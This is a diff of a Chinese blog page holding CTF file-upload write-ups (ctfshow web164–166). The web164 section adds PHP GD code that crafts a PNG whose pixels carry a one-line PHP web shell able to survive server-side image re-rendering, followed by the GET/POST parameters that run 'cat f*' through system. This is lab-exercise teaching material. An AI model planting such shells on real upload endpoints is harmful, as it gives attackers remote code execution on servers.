@@ -29,7 +29,7 @@
 <meta property="og:description" content="前言没啥好说的。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-01-10T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-01-11T16:55:26.921Z">
+<meta property="article:modified_time" content="2023-01-12T09:00:15.343Z">
 <meta property="article:author" content="Bron">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="文件上传">
@@ -129,17 +129,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">38</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">39</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">37</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">38</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">109</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">110</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -224,7 +224,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-01-12 00:55:26" itemprop="dateModified" datetime="2023-01-12T00:55:26+08:00">2023-01-12</time>
+                <time title="修改时间：2023-01-12 17:00:15" itemprop="dateModified" datetime="2023-01-12T17:00:15+08:00">2023-01-12</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -253,14 +253,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.9k</span>
+              <span>5.3k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
+              <span>5 分钟</span>
             </span>
 
         </div>
@@ -315,6 +315,14 @@
 </li>
 </ol>
 <h1 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h1><p>与上一题相同</p>
+<h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><p>图片上传后会对其重命名，并且需要上传真实的png图片。<br>一般的一句话木马图片上传后会对其二次渲染，导致图片内的木马消失。</p>
+<p>图片二次渲染是指对已经存在的图片进行修改或重新绘制的过程。这可以包括调整图像的颜色，添加新元素，或者删除现有元素等。<br>二次渲染可以用来改变图片的外观，或者用来添加水印，或者用来删除不需要的元素。它也可以用来调整图像的尺寸，或者对图像进行格式转换等。<br>图像二次渲染可以使用许多不同的工具来实现，包括专业的图像编辑软件，如 Photoshop 或 GIMP，也可以使用编程语言和图像处理库，如 PHP GD 库。<br>在图像处理过程中，二次渲染可以使用许多不同的技术，如图像分析、图像滤镜、图像插值和图像变换等。</p>
+<p>因此我们需要通过PHP GD库来创建一张含有木马的图片能绕过服务器的二次渲染。PHP代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;D:/temp/b2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 图片内木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这段代码使用了 PHP GD 库来创建一张新图片，尺寸为32x32像素。然后它使用一个十六进制数组来循环，并使用红色、绿色和蓝色值来设置图像中的像素。最后将图像保存为”b2.png”，保存在temp目录中。<br>将该图片上传后，访问该图片地址，并且传入以下参数：<br>GET:<br><code>http://eef25c0f-86f4-4cc9-9269-c17440f534c2.challenge.ctf.show/download.php?image=88c1ceb8ad1b0be7870b26ce8f79acc7.png&amp;0=system</code><br>POST:<br><code>1=cat f*</code></p>
+<p>这样便能拿到flag</p>
+<h1 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h1><p>jpg的二次渲染，但我没成功，暂时搁置吧</p>
+<h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><p>仍然失败，看来需要暂时做点别的换换心情了。</p>
 
     </div>
 
@@ -404,7 +412,10 @@
     <a href="/2023/01/11/sqli-labs%201-65/" rel="prev" title="sqli-labs 1-65">
       <i class="fa fa-chevron-left"></i> sqli-labs 1-65
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2023/01/13/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/" rel="next" title="ctfshow-web入门-爆破">
+      ctfshow-web入门-爆破 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -463,7 +474,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web151"><span class="nav-number">2.</span> <span class="nav-text">web151</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web152"><span class="nav-number">3.</span> <span class="nav-text">web152</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web153"><span class="nav-number">4.</span> <span class="nav-text">web153</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web154"><span class="nav-number">5.</span> <span class="nav-text">web154</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web155"><span class="nav-number">6.</span> <span class="nav-text">web155</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web156"><span class="nav-number">7.</span> <span class="nav-text">web156</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web157"><span class="nav-number">8.</span> <span class="nav-text">web157</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web158"><span class="nav-number">9.</span> <span class="nav-text">web158</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web159"><span class="nav-number">10.</span> <span class="nav-text">web159</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web160"><span class="nav-number">11.</span> <span class="nav-text">web160</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web161"><span class="nav-number">12.</span> <span class="nav-text">web161</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web162"><span class="nav-number">13.</span> <span class="nav-text">web162</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web163"><span class="nav-number">14.</span> <span class="nav-text">web163</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web151"><span class="nav-number">2.</span> <span class="nav-text">web151</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web152"><span class="nav-number">3.</span> <span class="nav-text">web152</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web153"><span class="nav-number">4.</span> <span class="nav-text">web153</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web154"><span class="nav-number">5.</span> <span class="nav-text">web154</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web155"><span class="nav-number">6.</span> <span class="nav-text">web155</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web156"><span class="nav-number">7.</span> <span class="nav-text">web156</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web157"><span class="nav-number">8.</span> <span class="nav-text">web157</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web158"><span class="nav-number">9.</span> <span class="nav-text">web158</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web159"><span class="nav-number">10.</span> <span class="nav-text">web159</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web160"><span class="nav-number">11.</span> <span class="nav-text">web160</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web161"><span class="nav-number">12.</span> <span class="nav-text">web161</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web162"><span class="nav-number">13.</span> <span class="nav-text">web162</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web163"><span class="nav-number">14.</span> <span class="nav-text">web163</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web164"><span class="nav-number">15.</span> <span class="nav-text">web164</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web165"><span class="nav-number">16.</span> <span class="nav-text">web165</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web166"><span class="nav-number">17.</span> <span class="nav-text">web166</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -479,20 +490,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">109</span>
+          <span class="site-state-item-count">110</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">37</span>
+        <span class="site-state-item-count">38</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-count">39</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -550,13 +561,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">299k</span>
+    <span title="站点总字数">306k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:32</span>
+    <span title="站点阅读时长">4:38</span>
 </div>
 
 <!--
